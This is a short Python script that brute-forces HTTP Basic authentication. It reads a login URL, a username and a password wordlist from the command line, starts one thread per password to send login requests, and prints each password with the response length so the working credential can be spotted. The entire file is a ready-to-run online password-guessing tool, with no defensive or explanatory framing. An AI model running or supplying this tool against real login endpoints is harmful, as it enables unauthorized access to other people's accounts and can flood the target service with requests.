from requests.auth import HTTPBasicAuth
from requests import get
from sys import argv
from threading import Thread

url = str(argv[1]) # Login url.
userName = str(argv[2]) # Single username
passwordFile = open(str(argv[3]), "r")

data = passwordFile.readlines()
data = [x.split("\n")[0] for x in data]


def Login(user, passw):
    req = get(url, auth=(user, passw))
    print("Password: ",passw,"Content Length : " ,len(req.text))

for d in data:
    t = Thread(target=Login, args=(userName, d,))
    t.start()

